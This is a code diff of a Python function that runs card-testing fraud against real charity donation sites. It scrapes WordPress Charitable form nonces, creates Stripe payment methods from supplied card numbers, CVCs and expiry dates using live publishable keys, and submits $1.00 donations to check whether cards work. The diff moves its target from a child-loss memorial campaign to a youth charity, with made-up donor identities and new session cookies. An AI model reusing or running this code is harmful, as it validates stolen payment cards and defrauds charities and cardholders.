@@ -1472,7 +1472,7 @@ def go7(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        response = requests.get('https://journalingthroughchildloss.com/campaigns/my-daughter-holly/donate/', headers=headers)
+        response = requests.get('https://youthnavigation.com/?campaign=right-path-bright-future-journey&donate=1', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -1484,23 +1484,23 @@ def go7(cc_input: str) -> str:
         	
         #2
         headers = {
-    'authority': 'api.stripe.com',
-    'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'pragma': 'no-cache',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': user,
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': user,
         }
-        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=AU&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F5b3d231411%3B+stripe-js-v3%2F5b3d231411%3B+card-element&referrer=https%3A%2F%2Fjournalingthroughchildloss.com&time_on_page=22269&client_attribution_metadata[client_session_id]=a8f147b9-98f4-466e-a8dc-f0026e2d0cd9&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51RYXfrG6vswUk4I75Tf67Mf9a3RuRAjVfBxNBPqTJ666AXP5QrznWn7vD9PFOCRFlI0shGQf8M8wJMM5BEnfd6Th000sLkrsHp'
+        
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=AF&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fyouthnavigation.com&time_on_page=26601&client_attribution_metadata[client_session_id]=b8ccfb73-531a-4f5f-806a-c187404bf4aa&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51PoRniGyxvehXwNqv9mXT43nRISSymJJqtzNNRutsGSYJdp0mISH0j3tGymmAPOfRu3TnuFw48ay9613tl32cVQU00WhMe92Fe'
+        
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
         pm = res_json.get('id')
@@ -1511,65 +1511,56 @@ def go7(cc_input: str) -> str:
                 
         #3
         cookies = {
-    '__stripe_mid': '2cbc56d6-aa31-49d7-9e31-9e96ae8ae686c188fc',
-    'charitable_session': '4cabc037d0927b8780bd54e633d74d16||86400||82800',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2025-12-04%2006%3A24%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fjournalingthroughchildloss.com%2Fcampaigns%2Fmy-daughter-holly%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fjournalingthroughchildloss.com%2Fcampaigns%2Fmy-daughter-holly%2F',
-    'sbjs_first_add': 'fd%3D2025-12-04%2006%3A24%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fjournalingthroughchildloss.com%2Fcampaigns%2Fmy-daughter-holly%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fjournalingthroughchildloss.com%2Fcampaigns%2Fmy-daughter-holly%2F',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
-    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fjournalingthroughchildloss.com%2Fcampaigns%2Fmy-daughter-holly%2Fdonate%2F',
-    '__stripe_sid': 'dc4c9594-6716-43c5-926c-fb648899557ce6f4bb',
+            'charitable_session': 'f5377a92140b03923360385855f119cc||86400||82800',
+            '__stripe_mid': 'fb0d5236-4918-4a3f-a4cd-59e8494d50622a41cb',
+            '__stripe_sid': 'ee7cf216-125d-4cf5-ade2-b35b163bc9abeff6e5',
         }
+        
         headers = {
-    'authority': 'journalingthroughchildloss.com',
-    'accept': 'application/json, text/javascript, */*; q=0.01',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://journalingthroughchildloss.com',
-    'pragma': 'no-cache',
-    'referer': 'https://journalingthroughchildloss.com/campaigns/my-daughter-holly/donate/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': user,
-    'x-requested-with': 'XMLHttpRequest',
+            'authority': 'youthnavigation.com',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': 'charitable_session=f5377a92140b03923360385855f119cc||86400||82800; __stripe_mid=fb0d5236-4918-4a3f-a4cd-59e8494d50622a41cb; __stripe_sid=ee7cf216-125d-4cf5-ade2-b35b163bc9abeff6e5',
+            'origin': 'https://youthnavigation.com',
+            'referer': 'https://youthnavigation.com/?campaign=right-path-bright-future-journey&donate=1',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
         }
+        
         data = {
-    'charitable_form_id': f'{form_id}',
-    f'{form_id}': '',
-    '_charitable_donation_nonce': f'{donation_nonce}',
-    '_wp_http_referer': '/campaigns/my-daughter-holly/donate/',
-    'campaign_id': f'{campaign_id}',
-    'description': 'Support Hollys Legacy',
-    'ID': f'{donation_id}',
-    'gateway': 'stripe',
-    'custom_donation_amount': '1.00',
-    'first_name': 'Tiana',
-    'last_name': 'Jakubowski',
-    'email': email,
-    'address': '24 George Street',
-    'address_2': '',
-    'city': 'Racie',
-    'state': 'New South Walet',
-    'postcode': '2000',
-    'country': 'AU',
-    'phone': '+61290123456',
-    'stripe_payment_method': f'{pm}',
-    'action': 'make_donation',
-    'form_action': 'make_donation',
+            'charitable_form_id': f'{form_id}',
+            f'{form_id}': '',
+            '_charitable_donation_nonce': f'{donation_nonce}',
+            '_wp_http_referer': '/?campaign=right-path-bright-future-journey&donate=1',
+            'campaign_id': f'{campaign_id}',
+            'description': 'Right Path, Bright Future Journey',
+            'ID': f'{donation_id}',
+            'gateway': 'stripe',
+            'donation_amount': 'custom',
+            'custom_donation_amount': '1.00',
+            'first_name': 'Gen',
+            'last_name': 'Paypal',
+            'email': email,
+            'address': '',
+            'address_2': '',
+            'city': '',
+            'state': '',
+            'postcode': '',
+            'country': 'AF',
+            'phone': '',
+            'stripe_payment_method': f'{pm}',
+            'action': 'make_donation',
+            'form_action': 'make_donation',
         }
-        response = requests.post(
-    'https://journalingthroughchildloss.com/wp-admin/admin-ajax.php',
-    cookies=cookies,
-    headers=headers,
-    data=data,#, proxies=proxy, timeout=30)    
-        )
+        
+        response = requests.post('https://youthnavigation.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
         if "secret" in response.text:
             print("✅ req3 required. Continue with next step...")
             response_str = response.text
@@ -1606,7 +1597,7 @@ def go7(cc_input: str) -> str:
             data = {
     'expected_payment_method_type': 'card',
     'use_stripe_sdk': 'true',
-    'key': 'pk_live_51RYXfrG6vswUk4I75Tf67Mf9a3RuRAjVfBxNBPqTJ666AXP5QrznWn7vD9PFOCRFlI0shGQf8M8wJMM5BEnfd6Th000sLkrsHp',
+    'key': 'pk_live_51PoRniGyxvehXwNqv9mXT43nRISSymJJqtzNNRutsGSYJdp0mISH0j3tGymmAPOfRu3TnuFw48ay9613tl32cVQU00WhMe92Fe',
     'client_secret': full_secret,
             }
             response = requests.post(
